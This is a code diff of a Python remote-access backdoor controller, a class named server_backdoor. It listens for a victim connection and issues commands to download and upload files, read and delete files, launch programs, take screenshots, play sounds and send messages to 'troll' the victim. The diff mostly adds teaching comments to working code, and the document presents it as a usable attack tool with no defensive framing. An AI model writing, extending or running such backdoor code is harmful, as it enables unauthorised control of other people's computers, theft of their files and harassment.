@@ -5,8 +5,8 @@ import base64
 import task_manager as tm
 from colorama import init, Fore
 
+#JSON - Way of converting objects to strings
 class server_backdoor:
-    work_manager = tm.manager()
     required_arguments = ["download", "troll", "upload", "launch", "del", "read", "psound", "sdmsg", "cgstate"]
 
     TROLL_PATH = os.getcwd() +  "\Backdoor\SFX\\"
@@ -20,15 +20,15 @@ class server_backdoor:
         try:
             self.show_painting()
 
-            listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        #Address family, Socket type 
+            listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)      #Allows us to reuse sockets, so in case our connection drops, we can establish a new one.
             listener.bind((ip, port))
-            listener.listen(0)
+            listener.listen(0)      #Number of connections, before the system starts to refuse connections
 
             print("{}[+] Waiting for connections.{}".format(Fore.CYAN, Fore.WHITE))
             self.connection, address = listener.accept()
             print("{}[+] Got a connection from {}{}".format(Fore.GREEN, address, Fore.WHITE))
-        except Exception as e:
+        except socket.error as e:
             print("Error connecting: {}".format(e))
 
     def show_painting(self):
@@ -62,7 +62,7 @@ class server_backdoor:
             try:
                 json_data = json_data + self.connection.recv(1024)
                 return json.loads(json_data)
-            except ValueError:
+            except ValueError:      #We need to receive more data
                 continue
             except Exception as e:
                 return "[-] (Server) Couldn't receive the data, {}.".format(e)
@@ -85,12 +85,12 @@ class server_backdoor:
         try:
             with open(path, "wb") as file:
                 file.write(base64.b64decode(content))
-                return "[+] Successfuly downloaded to: {}.".format(path)            
+                return "[+] Successfuly downloaded to: {}.".format(path)   
         except Exception as e:
             return "[-] (Server) Couldn't write to: {}, {}.".format(path, e)
 
     def read_file(self, path):
-        try:            
+        try:
             with open(path, "rb") as file:
                 return base64.b64encode(file.read()).decode()
         except Exception as e:
@@ -121,7 +121,7 @@ class server_backdoor:
             return "[-] Error during download of the screenshot: {}.".format(e)
 
     def is_valid(self, cmd_0, rest_of_command):
-        #We are checking if the user wrote something that requires argument and if he really provided 
+        #We are checking if the user wrote a command that requires an argument and if he really provided one 
         for i in self.required_arguments:
             if cmd_0 == i:
                 if len(rest_of_command) == 0:
@@ -183,7 +183,7 @@ class server_backdoor:
                     if command_0 == "help":
                         self.help_menu()
                         continue
-                    elif command_0 == "upload":                        
+                    elif command_0 == "upload":
                         p_index = command.index("-p")
                         t_index = command.index("-t")
                         file_path = " ".join(command[p_index + 1: t_index])     #Getting the file we want to upload location
@@ -216,7 +216,7 @@ class server_backdoor:
 
                     result = self.execute_remotely(command)
                     if "[-]" not in result:                        
-                        if command_0 == "download" and rest_of_command != "":
+                        if command_0 == "download":
                             path = os.getcwd() + "\\" + rest_of_command
                             result = self.write_file(path, result)
                         elif command_0 == "screenshot":
